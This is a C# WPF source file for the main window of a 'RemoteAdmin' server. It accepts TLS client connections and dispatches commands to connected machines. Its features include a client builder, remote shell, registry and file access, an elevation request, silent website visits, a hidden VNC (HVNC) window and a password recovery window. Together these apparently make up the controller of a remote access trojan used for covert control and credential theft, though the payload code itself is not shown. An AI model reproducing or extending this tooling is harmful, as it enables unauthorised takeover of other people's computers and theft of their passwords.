using System;
using System.Collections.ObjectModel;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Media;
using Microsoft.Win32;
using Newtonsoft.Json;
using RemoteAdmin.Shared;

namespace RemoteAdmin.Server
{
    public partial class MainWindow : Window
    {
        private ServerSettings settings;
        private ObservableCollection<ConnectedClient> clients;
        private Networking.ClientHandler _clientHandler;
        private TcpListener listener;
        private string l2ca= "";
        private int listenPort = 5900;
        private bool isRunning = false;

        private X509Certificate2 serverCert;
        private X509Certificate2 caCert;

        public MainWindow()
        {
            InitializeComponent();
            clients = new ObservableCollection<ConnectedClient>();
            _clientHandler = new Networking.ClientHandler(clients,this.Dispatcher,UpdateClientCount);
            ClientsGrid.ItemsSource = clients;
        }

        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            try
            {
                LoadAvailableIPs();
                settings = SettingsManager.Load();

                txtServerPort.Text = settings.ListenPort.ToString();
                SelectBindIPIfAvailable(settings.BindIP);
                pwdCaPassword.Password = SecretBox.UnprotectFromBase64(settings.EncryptedCaPassword);

                listenPort = settings.ListenPort;
                l2ca = pwdCaPassword.Password; // decrypted value


                // Load server certificate (with private key)
                serverCert = new X509Certificate2(
                    Path.Combine("Certificates", "server.pfx"),
                    l2ca,
                    X509KeyStorageFlags.Exportable |
                    X509KeyStorageFlags.MachineKeySet |
                    X509KeyStorageFlags.PersistKeySet);

                if (!serverCert.HasPrivateKey)
                    throw new Exception("Server certificate missing private key.");

                // Load CA certificate (public only)
                caCert = new X509Certificate2(
                    Path.Combine("Certificates", "ca.crt"));

                CheckCertificateStatus();
                StartServer();
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Failed to load certificates:\n{ex.Message}", "Certificate Error",
                    MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }


        private void SelectBindIPIfAvailable(string ip)
        {
            if (string.IsNullOrWhiteSpace(ip)) { cmbBindIP.SelectedIndex = 0; return; }
            for (int i = 0; i < cmbBindIP.Items.Count; i++)
            {
                if (string.Equals(cmbBindIP.Items[i]?.ToString(), ip, StringComparison.OrdinalIgnoreCase))
                {
                    cmbBindIP.SelectedIndex = i;
                    return;
                }
            }
            cmbBindIP.SelectedIndex = 0;
        }


        private void StartServer()
        {
            try
            {
                listener = new TcpListener(IPAddress.Any, listenPort);
                listener.Start();
                isRunning = true;

                txtListeningPort.Text = listenPort.ToString();
                txtServerStatus.Text = $"Server is running on port {listenPort}";
                txtServerStatus.Foreground = System.Windows.Media.Brushes.Green;

                // Accept clients in background
                _ = Task.Run(async () => await AcceptClients());
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error starting server: {ex.Message}", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }

        private void LoadAvailableIPs()
        {
            cmbBindIP.Items.Clear();

            // Add localhost first
            cmbBindIP.Items.Add("127.0.0.1");

            // Get all IPv4 addresses on the host
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList.Where(a => a.AddressFamily == AddressFamily.InterNetwork))
            {
                cmbBindIP.Items.Add(ip.ToString());
            }

            // Default selection
            cmbBindIP.SelectedIndex = 0;
        }


        private async Task AcceptClients()
        {
            while (isRunning)
            {
                var tcpClient = await listener.AcceptTcpClientAsync();
                _ = Task.Run(async () =>
                {
                    try
                    {
                        var networkStream = tcpClient.GetStream();
                        var sslStream = await NetworkHelper.CreateServerSslStreamAsync(
                            networkStream, serverCert, caCert);

                        Console.WriteLine("Secure client connection established");

                        await _clientHandler.HandleAsync(tcpClient, sslStream);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"TLS handshake failed: {ex.Message}");
                        tcpClient.Close();
                    }
                });
            }
        }

        private void UpdateClientCount()
        {
            txtClientCount.Text = clients.Count.ToString();
        }

        private void RestartServer_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                if (!int.TryParse(txtServerPort.Text, out int newPort))
                {
                    MessageBox.Show("Please enter a valid port number", "Error",
                        MessageBoxButton.OK, MessageBoxImage.Error);
                    return;
                }

                // Save settings from UI before restart
                SaveSettingsFromUI();

                // Stop current server
                isRunning = false;
                listener?.Stop();

                foreach (var client in clients.ToList())
                    client.Connection?.Close();
                clients.Clear();

                // Apply new port & start
                listenPort = settings.ListenPort; // SaveSettingsFromUI put it there
                StartServer();

                MessageBox.Show($"Server restarted on port {listenPort}", "Success",
                    MessageBoxButton.OK, MessageBoxImage.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error restarting server: {ex.Message}", "Error",
                    MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }

        private void SaveSettingsFromUI()
        {
            settings ??= new ServerSettings();

            settings.BindIP = cmbBindIP.SelectedItem?.ToString() ?? "127.0.0.1";

            if (int.TryParse(txtServerPort.Text, out var port))
                settings.ListenPort = port;

            // Encrypt the CA password before storing
            settings.EncryptedCaPassword = SecretBox.ProtectToBase64(pwdCaPassword.Password);

            // Optional: bind to a checkbox if you add one to XAML
            // settings.AutoStart = chkAutoStart.IsChecked == true;

            SettingsManager.Save(settings);
        }

        private void GenerateClient_Click(object sender, RoutedEventArgs e)
        {
            var builderWindow = new BuilderWindow();
            builderWindow.ShowDialog();
        }

        private void CertificateManager_Click(object sender, RoutedEventArgs e)
        {
            var certWindow = new CertificateManagerWindow();
            certWindow.ShowDialog();

            // After closing, check certificate status
            CheckCertificateStatus();
        }

        private void CheckCertificateStatus()
        {
            try
            {
                string certPath = System.IO.Path.Combine("Certificates", "server.pfx");

                if (System.IO.File.Exists(certPath))
                {
                    var cert = new System.Security.Cryptography.X509Certificates.X509Certificate2(
                        certPath, l2ca,
                        System.Security.Cryptography.X509Certificates.X509KeyStorageFlags.Exportable);

                    if (cert.NotAfter < DateTime.Now)
                    {
                        txtCertStatus.Text = "Certificates expired!";
                        txtCertStatus.Foreground = new SolidColorBrush(Color.FromRgb(231, 76, 60)); // Red
                    }
                    else if (cert.NotAfter < DateTime.Now.AddDays(30))
                    {
                        txtCertStatus.Text = $"Certificates expire soon: {cert.NotAfter:yyyy-MM-dd}";
                        txtCertStatus.Foreground = new SolidColorBrush(Color.FromRgb(230, 126, 34)); // Orange
                    }
                    else
                    {
                        txtCertStatus.Text = $"Certificates valid until {cert.NotAfter:yyyy-MM-dd}";
                        txtCertStatus.Foreground = new SolidColorBrush(Color.FromRgb(76, 175, 80)); // Green
                    }
                }
                else
                {
                    txtCertStatus.Text = "No certificates found - Generate them first!";
                    txtCertStatus.Foreground = new SolidColorBrush(Color.FromRgb(170, 170, 170)); // Gray
                }
            }
            catch
            {
                txtCertStatus.Text = "Certificates not checked";
                txtCertStatus.Foreground = new SolidColorBrush(Color.FromRgb(170, 170, 170)); // Gray
            }
        }

        private void RemoteDesktop_Click(object sender, RoutedEventArgs e)
        {
            var selectedClient = ClientsGrid.SelectedItem as ConnectedClient;
            if (selectedClient != null)
            {
                if (selectedClient.RemoteDesktopWindow != null && selectedClient.RemoteDesktopWindow.IsLoaded)
                {
                    selectedClient.RemoteDesktopWindow.Activate();
                }
                else
                {
                    var desktopWindow = new RemoteDesktopWindow(selectedClient);
                    selectedClient.RemoteDesktopWindow = desktopWindow;
                    desktopWindow.Show();
                }
            }
        }

        private async void RequestElevation_Click(object sender, RoutedEventArgs e)
        {
            var selectedClient = ClientsGrid.SelectedItem as ConnectedClient;
            if (selectedClient == null)
            {
                MessageBox.Show("Please select a client first.", "No Client Selected",
                    MessageBoxButton.OK, MessageBoxImage.Information);
                return;
            }

            var confirm = MessageBox.Show(
                $"Request elevation on {selectedClient.ComputerName}?",
                "Confirm Elevation",
                MessageBoxButton.YesNo,
                MessageBoxImage.Question);

            if (confirm != MessageBoxResult.Yes) return;

            try
            {
                // Send the elevation request message
                var msg = new ElevationRequestMessage();  // the class we defined earlier
                await NetworkHelper.SendMessageAsync(selectedClient.Stream, msg);

                MessageBox.Show($"Elevation request sent to {selectedClient.ComputerName}",
                    "Request Sent",
                    MessageBoxButton.OK,
                    MessageBoxImage.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Failed to send elevation request:\n{ex.Message}",
                    "Error",
                    MessageBoxButton.OK,
                    MessageBoxImage.Error);
            }
        }


        private void RemoteRegistry_Click(object sender, RoutedEventArgs e)
        {
            var selectedClient = ClientsGrid.SelectedItem as ConnectedClient;
            if (selectedClient != null)
            {
                // Check if registry editor window is already open for this client
                if (selectedClient.Registryeditorwindow != null && selectedClient.Registryeditorwindow.IsLoaded)
                {
                    selectedClient.Registryeditorwindow.Activate();
                }
                else
                {
                    // Create new registry editor window
                    var registryWindow = new RegistryEditorWindow(selectedClient);
                    registryWindow.Show();
                }
            }
            else
            {
                MessageBox.Show(
                    "Please select a client first.",
                    "No Client Selected",
                    MessageBoxButton.OK,
                    MessageBoxImage.Information);
            }
        }

        private void RemoteShell_Click(object sender, RoutedEventArgs e)
        {
            var selectedClient = ClientsGrid.SelectedItem as ConnectedClient;
            if (selectedClient != null)
            {
                // Check if shell window is already open for this client
                if (selectedClient.ShellWindow != null && selectedClient.ShellWindow.IsLoaded)
                {
                    selectedClient.ShellWindow.Activate();
                }
                else
                {
                    // Create new shell window
                    var shellWindow = new ShellWindow(selectedClient);
                    selectedClient.ShellWindow = shellWindow;
                    shellWindow.Show();
                }
            }
        }

        private void TaskManager_Click(object sender, RoutedEventArgs e)
        {
            var selectedClient = ClientsGrid.SelectedItem as ConnectedClient;
            if (selectedClient != null)
            {
                // Check if task manager window is already open for this client
                if (selectedClient.TaskManagerWindow != null && selectedClient.TaskManagerWindow.IsLoaded)
                {
                    selectedClient.TaskManagerWindow.Activate();
                }
                else
                {
                    // Create new task manager window
                    var taskManagerWindow = new TaskManagerWindow(selectedClient);
                    selectedClient.TaskManagerWindow = taskManagerWindow;
                    taskManagerWindow.Show();
                }
            }
        }

        private void StartUpManager_Click(object sender, RoutedEventArgs e)
        {
            var selectedClient = ClientsGrid.SelectedItem as ConnectedClient;

            if (selectedClient.StartupManagerWindow != null && selectedClient.StartupManagerWindow.IsLoaded)
            {
                selectedClient.StartupManagerWindow.Activate();
            }
            else
            {
                var startupManagerWindow = new StartupManagerWindow(selectedClient);
                selectedClient.StartupManagerWindow = startupManagerWindow;
                startupManagerWindow.Show();
            }
        }

        private void Sysinfo_Click(object sender, RoutedEventArgs e)
        {
            var selectedClient = ClientsGrid.SelectedItem as ConnectedClient;

            if (selectedClient.SystemInformationWindow != null && selectedClient.SystemInformationWindow.IsLoaded)
            {
                selectedClient.SystemInformationWindow.Activate();
            }
            else
            {
                var sysInfowindow = new SystemInformationWindow(selectedClient);
                selectedClient.SystemInformationWindow = sysInfowindow;
                sysInfowindow.Show();
            }

        }
        private void TaskScheduler_Click(object sender, RoutedEventArgs e)
        {
            var selectedClient = ClientsGrid.SelectedItem as ConnectedClient;

            if (selectedClient.TaskSchedulerWindow != null && selectedClient.TaskSchedulerWindow.IsLoaded)
            {
                selectedClient.TaskSchedulerWindow.Activate();
            }
            else
            {
                var taskScheduler = new TaskSchedulerWindow(selectedClient);
                selectedClient.TaskSchedulerWindow = taskScheduler;
                taskScheduler.Show();
            }

        }

        private async void PowerRestart_Click(object sender, RoutedEventArgs e)
        {
            await SendPowerCommand("Restart", "Are you sure you want to restart this computer?");
        }

        private async void PowerShutdown_Click(object sender, RoutedEventArgs e)
        {
            await SendPowerCommand("Shutdown", "Are you sure you want to shutdown this computer?");
        }

        private async void PowerSleep_Click(object sender, RoutedEventArgs e)
        {
            await SendPowerCommand("Sleep", "Are you sure you want to put this computer to sleep?");
        }

        private async void PowerLogOff_Click(object sender, RoutedEventArgs e)
        {
            await SendPowerCommand("LogOff", "Are you sure you want to log off the current user?");
        }

        private async Task SendPowerCommand(string command, string confirmMessage)
        {
            var selectedClient = ClientsGrid.SelectedItem as ConnectedClient;
            if (selectedClient != null)
            {
                var result = MessageBox.Show(
                    $"{confirmMessage}\n\nComputer: {selectedClient.ComputerName}",
                    $"Confirm {command}",
                    MessageBoxButton.YesNo,
                    MessageBoxImage.Warning);

                if (result == MessageBoxResult.Yes)
                {
                    try
                    {
                        var powerMsg = new PowerCommandMessage
                        {
                            Command = command
                        };

                        await NetworkHelper.SendMessageAsync(selectedClient.Stream, powerMsg);
                        MessageBox.Show($"{command} command sent successfully", "Success", MessageBoxButton.OK, MessageBoxImage.Information);
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show($"Error sending {command} command: {ex.Message}", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                    }
                }
            }
        }

        private void FileManager_Click(object sender, RoutedEventArgs e)
        {
            var selectedClient = ClientsGrid.SelectedItem as ConnectedClient;
            if (selectedClient != null)
            {
                // Check if file manager window is already open for this client
                if (selectedClient.FileManagerWindow != null && selectedClient.FileManagerWindow.IsLoaded)
                {
                    selectedClient.FileManagerWindow.Activate();
                }
                else
                {
                    // Create new file manager window
                    var fileManagerWindow = new FileManagerWindow(selectedClient);
                    selectedClient.FileManagerWindow = fileManagerWindow;
                    fileManagerWindow.Show();
                }
            }
        }


        private void Disconnect_Click(object sender, RoutedEventArgs e)
        {
            var selectedClient = ClientsGrid.SelectedItem as ConnectedClient;
            if (selectedClient != null)
            {
                selectedClient.Connection?.Close();
                clients.Remove(selectedClient);
                UpdateClientCount();
            }
        }

        private async void VisitWebsite_Click(object sender, RoutedEventArgs e)
        {
            var selectedClient = ClientsGrid.SelectedItem as ConnectedClient;
            if (selectedClient == null) return;

            // Create input dialog
            var inputWindow = new Window
            {
                Title = "Visit Website",
                Width = 500,
                Height = 220,
                WindowStartupLocation = WindowStartupLocation.CenterOwner,
                Owner = this,
                ResizeMode = ResizeMode.NoResize,
                Background = new SolidColorBrush(Color.FromRgb(30, 30, 30))
            };

            var panel = new StackPanel { Margin = new Thickness(20) };

            panel.Children.Add(new TextBlock
            {
                Text = "Enter website URL:",
                Foreground = Brushes.White,
                FontSize = 14,
                Margin = new Thickness(0, 0, 0, 10)
            });

            var txtUrl = new TextBox
            {
                FontSize = 14,
                Padding = new Thickness(8),
                Margin = new Thickness(0, 0, 0, 15)
            };
            panel.Children.Add(txtUrl);

            var chkHidden = new CheckBox
            {
                Content = "Visit silently (don't open browser)",
                Foreground = Brushes.LightGray,
                Margin = new Thickness(0, 0, 0, 20)
            };
            panel.Children.Add(chkHidden);

            var buttonPanel = new StackPanel
            {
                Orientation = Orientation.Horizontal,
                HorizontalAlignment = HorizontalAlignment.Right
            };

            var btnOk = new Button
            {
                Content = "Visit",
                Width = 80,
                Height = 30,
                Margin = new Thickness(0, 0, 10, 0),
                Background = new SolidColorBrush(Color.FromRgb(52, 152, 219)),
                Foreground = Brushes.White,
                BorderThickness = new Thickness(0)
            };

            var btnCancel = new Button
            {
                Content = "Cancel",
                Width = 80,
                Height = 30,
                Background = new SolidColorBrush(Color.FromRgb(51, 51, 55)),
                Foreground = Brushes.White,
                BorderThickness = new Thickness(0)
            };

            btnOk.Click += async (s, args) =>
            {
                string url = txtUrl.Text.Trim();
                if (string.IsNullOrWhiteSpace(url))
                {
                    MessageBox.Show("Please enter a URL", "Validation Error",
                        MessageBoxButton.OK, MessageBoxImage.Warning);
                    return;
                }

                inputWindow.DialogResult = true;
                inputWindow.Close();

                try
                {
                    var visitMsg = new VisitWebsiteMessage
                    {
                        Url = url,
                        Hidden = chkHidden.IsChecked ?? false
                    };

                    await NetworkHelper.SendMessageAsync(selectedClient.Stream, visitMsg);
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"Error sending command: {ex.Message}", "Error",
                        MessageBoxButton.OK, MessageBoxImage.Error);
                }
            };

            btnCancel.Click += (s, args) =>
            {
                inputWindow.DialogResult = false;
                inputWindow.Close();
            };

            buttonPanel.Children.Add(btnOk);
            buttonPanel.Children.Add(btnCancel);
            panel.Children.Add(buttonPanel);

            inputWindow.Content = panel;
            inputWindow.ShowDialog();
        }

        
        private void Password_Click(object sender, RoutedEventArgs e)
        {
            var selectedClient = ClientsGrid.SelectedItem as ConnectedClient;
            if (selectedClient != null)
            {
                // Check if HVNC window is already open for this client
                if (selectedClient.PasswordRecoveryWindow != null && selectedClient.PasswordRecoveryWindow.IsLoaded)
                {
                    selectedClient.PasswordRecoveryWindow.Activate();
                }
                else
                {
                    // Create new HVNC window
                    var passwordRecovery = new Passwordrecoverywindow(selectedClient);
                    selectedClient.PasswordRecoveryWindow = passwordRecovery;
                    passwordRecovery.Show();
                }
            }
        }

        private void MenuItem_OpenHvnc_Click(object sender, RoutedEventArgs e)
        {
            var selectedClient = ClientsGrid.SelectedItem as ConnectedClient;
            if (selectedClient != null)
            {
                // Check if HVNC window is already open for this client
                if (selectedClient.HvncWindow != null && selectedClient.HvncWindow.IsLoaded)
                {
                    selectedClient.HvncWindow.Activate();
                }
                else
                {
                    // Create new HVNC window
                    var hvncWindow = new Hvnc(selectedClient);
                    selectedClient.HvncWindow = hvncWindow;
                    hvncWindow.Show();
                }
            }
        }


        private void TabControl_SelectionChanged(object sender, System.Windows.Controls.SelectionChangedEventArgs e)
        {

        }
    }
}